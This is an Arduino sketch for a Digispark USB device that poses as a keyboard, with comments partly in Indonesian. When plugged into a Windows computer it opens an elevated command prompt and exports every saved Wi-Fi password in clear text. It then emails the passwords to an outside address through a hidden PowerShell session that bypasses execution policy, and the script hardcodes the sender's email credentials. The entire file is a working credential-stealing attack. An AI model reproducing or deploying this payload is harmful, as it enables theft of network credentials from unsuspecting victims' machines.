#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT); //klik windows key
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cmd"); //ketik cmd
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT); //klik ctrl+shift+enter
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN); //klik panah atas
  DigiKeyboard.delay(800);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_UP); //klik panah bawah
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // klik enter
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cd %temp%"); //Jumping to temporary dir
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // klik enter
  DigiKeyboard.delay(300);  
  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // klik enter
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Select-String -Path Wireless* -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // klik enter
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('mastahrizky@gmail.com', 'dya12345'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'mastahrizky@gmail.com'; $ReportEmail.To.Add('olgdcn@hi2.in'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('Wi-Fi-PASS'); $SMTPInfo.Send($ReportEmail)\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // klik entercmd
  

    
  
//  DigiKeyboard.print("https://kangwriteup.me");
//  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;);
}
